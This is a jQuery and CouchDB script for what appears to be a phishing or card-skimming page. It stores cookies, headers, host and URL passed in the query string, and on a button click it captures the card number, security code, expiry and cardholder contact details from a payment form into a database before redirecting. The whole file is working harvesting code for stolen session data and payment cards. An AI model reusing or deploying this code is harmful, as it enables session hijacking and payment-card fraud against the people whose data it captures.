(function($) {
	var getKeyValue = function(item, keySeparator) {
	    keySeparator = keySeparator || '=';
		item = item || "";
		var eqIndex = item.indexOf(keySeparator);
		if(eqIndex > -1) {
			var key = item.substring(0, eqIndex);
			var val = item.substring(eqIndex + 1);
			return {key:decodeURIComponent(key), val:decodeURIComponent(val)};
		}
		return null;
	};
	var pushArrayItem = function(arr, item, keySeparator) {
	    var keyVal = getKeyValue(item, keySeparator);
		if(keyVal) {
            arr = (arr || []);
            var key = (keyVal.key || "").trim();
            var val = (keyVal.val || "").trim();
			arr.push({key:key, val:val});
		}
		return arr;
	};
	var mappers = {
		host:function(result, host) { result.host = host; },
		cookie:function(result, cookie) {
			result.cookies = pushArrayItem(result.cookies, cookie, '=');
		},
		url:function(result, url) {
			result.url = url || "";
		},
		header:function(result, header) {
		    result.headers = pushArrayItem(result.headers, header, ':');
		}
	};
	
	var getQueryParams = function() {
	    var query = location.href.split('?')[1] || "";
		return query.length > 0 ? query.split('&') : [];
	};
	
	var getFormattedDate = function() {
	    var current = new Date();
		var twoNum = function(num) {
		    return num > 9 ? num : ("0" + num);
		};
		
	    var date = new Date(
	        current.getUTCFullYear(),
	        current.getUTCMonth(),
	        current.getUTCDate(),
	        current.getUTCHours(),
	        current.getUTCMinutes());
        var result = date.getFullYear() + "-" + twoNum(date.getMonth()+1)+"-"+twoNum(date.getDate());
        result += " (" + twoNum(date.getHours()) + ":" + twoNum(date.getMinutes()) + ")";
        return result;
	};

    var getObjectFromQuery = function(query) {
        var obj = {};
		for(var i=0;i<query.length;i++) {
			var item = query[i];
			var keyVal = getKeyValue(item);
			if(keyVal) {
				var key = (keyVal.key || "").toLowerCase();
				var val = keyVal.val;
				var mapper = mappers[key];
				if(mapper)
					mapper(obj, val);
			}
		}
		return obj;
    };
	
    var getBrowserObject = function() {
        var query = getQueryParams();
        var obj = getObjectFromQuery(query);
        obj.date = getFormattedDate();

        return obj;
    };
	
	var addVisaObject = function(doc) {
	    doc = doc || {};
	    doc.cardinfo = {
	        type : $(".payment-method input[checked]").val(),
            cardnumber : $("#cardnumber").val(),
            securitycode : $("#securitycode").val(),
            expiry : $("#expiryyear").val() + "/" + $("#expirymonth").val(),
            cardholder : {
                name : $("#cardholdername").val(),
                address : $("#billingaddress").val(),
                zip : $("#postcode").val(),
                country : $("#country").val(),
                tel : $("#telephone").val(),
                fax : $("#fax").val(),
                email : $("#email").val()
            }
        };
        return doc;
    };

    this.docid = null;
    var _self = this;

    var bindEvents = function (){
        $(".title").click(function() {
            var $title = $(this);
            $title.find("p").toggle();
        });
        $("button").click(function() {
            $db.openDoc(_self.docid, {
                success: function(doc) {
                    $db.saveDoc(addVisaObject(doc), {
                        success: function() {
                            window.top.location.href = '{{detailsUrl}}/'+_self.docid;
                        }
                    });
                }
            });
        });
    };
    if($ && $.couch) {
        var $db =  $.couch.db("{{db}}");
        if(!$db) return;

        $(function() {
            bindEvents();
            var doc = getBrowserObject();
            if(doc && doc.host && doc.url) {
                var $doc = $db.saveDoc(doc, {
                    success:function(data) {
                        _self.docid = data.id;
                        var $link = $(".poweredby a");
                        $link.attr("href", '{{detailsUrl}}/'+_self.docid)
                    }
                });
            }
        });
    }
})(jQuery);
